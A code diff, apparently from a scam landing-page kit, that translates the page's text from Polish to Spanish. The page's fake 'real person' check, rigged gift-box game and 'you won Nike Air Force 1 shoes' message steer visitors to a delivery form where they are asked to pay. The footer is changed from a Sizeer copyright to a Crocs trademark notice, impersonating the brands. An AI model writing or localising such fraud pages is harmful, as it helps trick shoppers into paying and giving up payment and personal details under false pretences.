@@ -49,10 +49,10 @@ const imageBase = baseUrl ?? landingUrl;
 
   const bottomRow = {
     bar: "menu",
-    account: "Zaloguj",
-    heart: "Schowek",
-    bag: "Koszyk",
-    find: "Szukaj"
+    account: "Iniciar sesión",
+    heart: "Lista de deseos",
+    bag: "Carrito",
+    find: "Buscar"
   };
 
   const mainProduct = {
@@ -156,57 +156,56 @@ const imageBase = baseUrl ?? landingUrl;
   };
 
   const check = {
-    title: "Twoja odpowiedź zostanie zweryfikowana...",
+    title: "Tu respuesta será verificada...",
     arr: [
-      "Odpowiedziałeś na pytanie 3/3.",
-      "Twój adres IP nie pozwala na wyciągnięcie wniosków na temat wcześniejszych żądań.",
-      "Twoja odpowiedź została zweryfikowana.",
+      "Has respondido a la pregunta 3/3.",
+      "Tu dirección IP no permite sacar conclusiones sobre solicitudes anteriores.",
+      "Tu respuesta ha sido verificada.",
     ],
   };
 
   const modals = {
     welcome: {
       texts: {
-        header:
-          "Gratulacje, potwierdziłeś, że jesteś prawdziwą osobą",
+        header: "Felicidades, has confirmado que eres una persona real",
         button: "OK",
         text: `
         <center>
-       Dzisiaj, {date}, masz szansę kupić parę butów Nike Air Force 1'07 w specjalnej cenie
+       Hoy, {date}, tienes la oportunidad de comprar un par de zapatos Nike Air Force 1'07 a un precio especial
           <br><br>
-         Wszystko, co musisz zrobić, to wybrać odpowiednie pudełko na prezent.
+         Todo lo que necesitas hacer es elegir la caja de regalo correcta.
           <br><br>
-      Masz 3 próby, powodzenia!
+      Tienes 3 intentos, ¡buena suerte!
         </center>
       `,
       },
     },
     first: {
       texts: {
-        header: "O nie...",
+        header: "Oh no...",
         button: "OK",
         text: `
         <center>
-    Niestety ten prezent jest pusty! Masz jeszcze 2 próby - powodzenia!
+    Lamentablemente, este regalo está vacío! Aún tienes 2 intentos - ¡buena suerte!
         </center>
       `,
       },
     },
     win: {
       texts: {
-        header: "Gratulacje! Wygrałeś!",
+        header: "¡Felicidades! ¡Has ganado!",
         button: "OK",
         text: `
         <center>
           <p style="color: #000">
-       Wygrałeś parę tenisówek "Nike Air Force 1'07"
+       Has ganado un par de zapatillas "Nike Air Force 1'07"
           </p>
           <br>
-            1) Kliknij „OK”, aby wejść na stronę dostawy.
+            1) Haz clic en "OK" para ir a la página de entrega.
             <br><br>
-            2) Wypełnij formularz i zapłać za zamówienie uwzględniając swój osobisty rabat.
+            2) Completa el formulario y paga el pedido aprovechando tu descuento personal.
             <br><br>
-            3) Paczka zostanie dostarczona w ciągu 2-3 dni.
+            3) El paquete será entregado en 2-3 días.
         </center>
       `,
       },
@@ -384,7 +383,7 @@ const imageBase = baseUrl ?? landingUrl;
   ];
 
   const footer = {
-    cr: "© 2024 Sizeer. Wszelkie prawa zastrzeżone.",
+    cr: "© Crocs™ | Copyright 2024 | Todos los derechos reservados",
   };
 
   const pathImgBox = {
